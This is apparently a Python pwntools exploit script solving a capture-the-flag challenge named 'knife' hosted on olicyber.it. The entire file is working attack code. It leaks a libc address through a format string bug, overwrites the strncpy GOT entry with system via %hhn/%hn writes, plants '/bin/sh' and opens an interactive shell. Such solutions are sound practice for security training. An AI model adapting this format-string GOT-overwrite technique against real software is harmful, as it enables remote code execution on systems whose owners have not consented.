#!/usr/bin/env python3

from pwn import *

elf = ELF("./knife_patched")
libc = ELF("./libc6_2.35-0ubuntu3.4_amd64.so")
ld = ELF("./ld-2.35.so")

context.binary = elf

def conn():
    if args.REMOTE:
        p = remote('knife.challs.olicyber.it', 11006)
    elif args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
            b main
            c
            ni 10
        ''')
    else:
        p = elf.process()

    return p


def main():
    p = conn()
    p.sendline(b'STORE 1 '+p64(elf.got["puts"])) ## uso piu funzioni della got per leakkare i loro offset e poi su libc.blukat trovo la libc.
    p.recvline()
    p.sendline(b'LOAD 1 %9$s')
    p.recvuntil(b'1 ')
    leak = int.from_bytes(p.recv(12).strip()[:6], "little")
    

    libc.address = leak - libc.sym['puts']
    

    system = libc.sym['system']
  
    print(f'System address: {hex(system)}')
    print(f'Got strncpy address: {hex(elf.got["strncpy"])}')
    p.sendline(b'STORE 2 ' + p64(elf.got['strncpy']))
    p.recvline()
    p.sendline(b'STORE 3 ' + p64(elf.got['strncpy'] +1))
    p.recvline()
    p.sendline(b'STORE 4 ' + p64(elf.got['strncpy'] +3))
    p.recvline()
    p.sendline(b'STORE 1 /bin/sh\x00')

    p.sendline(f'LOAD 7 %{system-7 & 0xff}c%10$hhn'.encode())
    p.recvline()
    print(f'Got strncpy address: {hex(elf.got["strncpy"]+1)}')

    p.sendline(f'LOAD 7 %{((system >>8)-7) & 0xffff}c%11$hn'.encode())
    p.recvline()

    p.sendline(b'STORE 1 zaza')

    p.interactive()

if __name__ == "__main__":
    main()
